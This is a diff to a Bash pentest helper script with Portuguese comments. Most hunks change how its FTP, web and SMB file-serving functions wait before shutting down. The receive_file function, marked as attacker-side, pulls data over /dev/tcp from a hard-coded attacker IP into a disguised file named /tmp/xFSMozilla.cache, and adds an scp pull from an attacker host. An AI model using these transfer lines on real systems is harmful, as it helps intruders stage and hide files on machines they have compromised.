@@ -167,7 +167,10 @@ py_ftpserver () {
     set +x
     sleep 2
     xdg-open "ftp://$myip:$port" &
-    read -p "Pressione ENTER para fechar." fim
+     # enquanto não digitar Y, não prossegue
+	while [ "$opt" != "Y" ]; do
+		read -p "Deseja fechar o servidor? [Y/n] " opt
+	done
     kill_all pyftpdlib
 }
 
@@ -192,7 +195,10 @@ ruby_webserver () {
     sudo ruby -run -e httpd . -p $port &
     set +x
     xdg-open "http://$myip:$port" &
-    xmessage "Pressione OK para fechar."
+     # enquanto não digitar Y, não prossegue
+	while [ "$opt" != "Y" ]; do
+		read -p "Deseja fechar o servidor? [Y/n] " opt
+	done
     kill_all ruby
 } 
 
@@ -216,7 +222,10 @@ php_webserver () {
     php -S 0.0.0.0:$port &
     set +x
     xdg-open "http://$myip:$port" &
-    xmessage "Pressione OK para fechar."
+     # enquanto não digitar Y, não prossegue
+	while [ "$opt" != "Y" ]; do
+		read -p "Deseja fechar o servidor? [Y/n] " opt
+	done
     kill_all php
 } 
 
@@ -240,7 +249,10 @@ smb_server () {
 	impacket-smbserver sharename . -username  kali -password kali -smb2support
 	set +x
     xdg-open "smb://$myip:$port" &
-    xmessage "Pressione OK para fechar."
+     # enquanto não digitar Y, não prossegue
+	while [ "$opt" != "Y" ]; do
+		read -p "Deseja fechar o servidor? [Y/n] " opt
+	done
     kill_all impacket
 } 
 
@@ -289,6 +301,7 @@ receive_file(){
 			echo "Rodar isso no atacante"
 			var_check attacker_host attacker_port
 			set -x
+			scp -P $attacker_port $attacker_host:$output $filename
 			set +x
 		;;
 		nc)
@@ -301,9 +314,11 @@ receive_file(){
 		*)
 			set -x
 			cat < /dev/tcp/${attacker_host:='192.168.93.27'}/${attacker_port:=8888} > ${outfile:='/tmp/xFSMozilla.cache'}
-			# {	while IFS= read -r -d '' -n 1 byte; do
-			# 		printf '%s' "$byte" >> "${output:='/tmp/outfile'}"
-			# 	done; } < "/dev/tcp/0.0.0.0/${target_port:='4444'}"
+			echo '
+			{	while IFS= read -r -d '' -n 1 byte; do
+					printf '%s' "$byte" >> "${output:='/tmp/outfile'}"
+				done; } < "/dev/tcp/0.0.0.0/${target_port:='4444'}"
+			'
 			set +x
 		;;
 	esac
